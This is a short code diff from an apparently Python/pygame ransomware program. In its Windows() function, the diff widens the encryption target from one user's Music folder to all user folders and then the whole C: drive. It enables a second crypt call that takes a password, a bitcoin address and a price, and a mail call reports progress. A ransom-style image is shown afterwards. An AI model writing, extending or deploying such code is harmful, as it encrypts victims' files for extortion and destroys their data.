@@ -20,8 +20,8 @@ import pygame_textinput
 
 def Windows():
     path=('C:')
-    text1=('C:/Users/fabien.marcos/Music/*')
-    #text2=('C:/*')
+    text1=('C:/Users/*')
+    text2=('C:/*')
     verif=""
     textexe='ejecutado'
     textfin='fin users'
@@ -103,8 +103,8 @@ def Windows():
 
     						crypt(text1, pwd, path, bitcoin, price,verif)
     						mail(textfin)
-						#crypt(text2, pwd, path, bitcoin, price,verif)
-						#mail(textall)
+						crypt(text2, pwd, path, bitcoin, price,verif)
+						mail(textall)
 
                         			fond = pygame.image.load("message.jpg").convert()
 						fond = pygame.transform.scale(fond, (640, 480))
